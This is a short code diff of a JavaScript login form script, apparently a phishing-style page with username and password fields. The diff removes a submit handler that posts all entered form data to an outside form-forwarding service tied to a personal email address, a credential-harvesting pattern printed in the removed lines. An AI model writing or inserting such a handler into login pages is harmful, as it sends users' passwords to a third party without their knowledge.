@@ -7,15 +7,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let unameVal = pwdVal = false;
     /////next button
-    const nxt = document.getElementById('btn_next').addEventListener("submit", async (e) => {
-  e.preventDefault();
-
-  const formData = new FormData(e.target);
-
-  await fetch("https://formsubmit.co/blueprint019019@gmail.com", {
-    method: "POST",
-    body: formData
-  });
+    const nxt = document.getElementById('btn_next');
 
     nxt.addEventListener('click', () => {
         //validate the form
